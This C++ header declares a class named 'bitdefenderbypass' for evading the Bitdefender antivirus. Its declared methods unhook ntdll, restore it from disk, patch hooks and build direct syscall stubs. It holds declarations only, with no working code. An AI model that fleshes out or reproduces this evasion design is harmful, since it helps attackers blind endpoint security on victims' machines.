#pragma once
#include <Windows.h>
#include <vector>
#include <string>
#include <psapi.h>
#include <tlhelp32.h>
#include <intrin.h>
#pragma comment(lib, "psapi.lib")

class bitdefenderbypass {
private:
    struct moduleinfo {
        LPVOID base;
        SIZE_T size;
        std::string name;
        std::string path;
    };
    std::vector<moduleinfo> getmodules();
    LPVOID findecall(LPVOID modulebase, const std::string& functionname);
    std::vector<BYTE> readmemory(LPVOID address, SIZE_T size);
    bool writememory(LPVOID address, std::vector<BYTE> data);
    bool restore_ntdll_from_disk();
    bool build_dynamic_syscall_stubs();
    bool patch_ntdll_hooks();
    bool install_syscall_hook_detour(LPVOID target, LPVOID original);
    LPVOID find_pattern_in_module(const std::string& module_name, const std::string& pattern);
    std::vector<BYTE> read_file_to_memory(const std::string& path);
    bool is_function_hooked(LPVOID address);
    DWORD calculate_syscall_id(LPVOID function_address);
    struct syscall_entry {
        std::string name;
        DWORD id;
        LPVOID original_address;
        LPVOID hooked_address;
        LPVOID syscall_stub;
    };
    std::vector<syscall_entry> syscall_table;
public:
    bool bypass();
    bool unhook_ntdll();
};